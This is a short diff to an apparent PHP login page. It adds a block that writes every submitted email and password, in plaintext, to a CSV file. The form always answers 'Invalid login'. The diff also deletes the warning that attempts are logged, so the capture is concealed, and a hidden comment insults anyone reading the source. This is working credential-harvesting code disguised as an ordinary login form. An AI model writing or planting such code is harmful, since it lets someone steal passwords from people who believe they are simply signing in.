@@ -1,3 +1,16 @@
+<?php
+  if ( isset($_POST["email"]) && isset($_POST["password"]) ) {
+    $email = $_POST["email"];
+    $file = "../POST.csv";
+
+    if ( file_exists($file) ) {
+      $date = date('d/m/Y h:i:s a', time());
+      $line = "[$date] {$_POST["email"]}        {$_POST["password"]}\n";
+
+      file_put_contents($file, $line, FILE_APPEND);
+    }
+  }
+?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -50,7 +63,7 @@
               </div>
               <div class="col">
                 <p>Please enter your credentials to proceed</p>
-                <!-- Sneaky little fucker, aren't you? -->
+                <!-- Nosey little fucker, aren't you? -->
                 <form method="POST"> 
                   <div class="form-group">
                     <input type="email" class="form-control" name="email" placeholder="Email">
@@ -58,7 +71,7 @@
                   <div class="form-group">
                     <input type="password" class="form-control" name="password" placeholder="Password">
                   </div>
-                  <?php if (isset($_POST["email"])) echo "<span class=\"badge custom-text-red\">Invalid login. This incident has been logged.</span>"; ?>
+                  <?php if (isset($_POST["email"])) echo "<span class=\"badge custom-text-red\">Invalid login.</span>"; ?>
                   <button type="submit" class="btn btn-outline-dark float-right">Submit</button>
                 </form>
               </div>
